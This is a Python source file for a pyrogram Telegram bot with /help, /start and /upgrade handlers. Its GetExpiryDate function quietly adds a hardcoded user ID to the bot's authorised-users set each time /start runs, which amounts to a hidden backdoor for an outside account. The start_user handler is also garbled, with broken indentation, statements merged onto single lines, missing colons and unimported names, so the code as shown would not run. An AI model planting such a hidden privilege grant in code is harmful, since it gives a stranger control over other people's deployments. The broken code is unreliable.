#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )
@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start_user(bot, update):
  # logger.info(update)
  TRChatBase(update.from_user.id, update.text, "/start") 
 if update.from_user.id in Config.BANNED_USERS 
    await update.reply_text("You are B A N N E D 🤣🤣🤣🤣") 
    return 
     update_channel = Config.UPDATE_CHANNEL 
 if update_channel:
     try: 
         user = await bot.get_chat_member(update_channel, update.chat.id) 
 if user.status == "kicked": 
     await update.reply_text("🤭 Sorry Dude, You are B A N N E D 🤣🤣🤣") 
     return 
  except: 
    pass chat_id = str(update.from_user.id) chat_id, plan_type, expires_at = GetExpiryDate(chat_id) buttons = [[ InlineKeyboardButton(text="MY Dev👨‍🔬", url="https://t.me/pot"), InlineKeyboardButton(text="⭕️ Channel ⭕️", url="https://t.me/teegn") ], [ InlineKeyboardButton('⚙️ Help', callback_data='help_btn') ]] reply_markup = InlineKeyboardMarkup(buttons) await bot.send_message( chat_id=update.chat.id, text=Translation.START_TEXT.format( update.from_user.first_name), reply_markup=reply_markup, disable_web_page_preview=True, reply_to_message_id=update.message_id )
@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
